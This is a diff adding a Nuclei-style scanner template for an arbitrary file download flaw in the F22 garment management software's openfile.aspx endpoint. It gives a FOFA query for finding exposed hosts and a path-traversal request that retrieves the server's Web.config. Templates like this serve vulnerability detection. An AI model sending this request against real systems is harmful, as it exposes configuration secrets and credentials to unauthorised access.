@@ -1,0 +1,25 @@
+id: jmtr-f22-oa-filedownload
+
+info:
+  name: F22服装管理软件系统openfile.aspx前台任意文件下载
+  author: m0be1
+  severity: high
+  description: 广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在接口未授权访问，通过未授权的口/oa/isprit/module/openfile.aspx存在任意文件下载漏洞。攻击者最终可利用该漏洞获取敏感信息。
+  reference:
+    - https://github.com/netuseradministrator/netuseradministrator.github.io/blob/034322c134f7e12b5f9e968c0c4456131e63e293/unknownformat/jmtr-f22-oa-filedownload.docx#L20
+  metadata: 
+    fofa-query: body="images/key.gif"
+    verified: true
+    max-request: 1
+  tags: 志华软件-F22
+
+http:
+  - raw:
+      - |
+        GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"<?xml")'
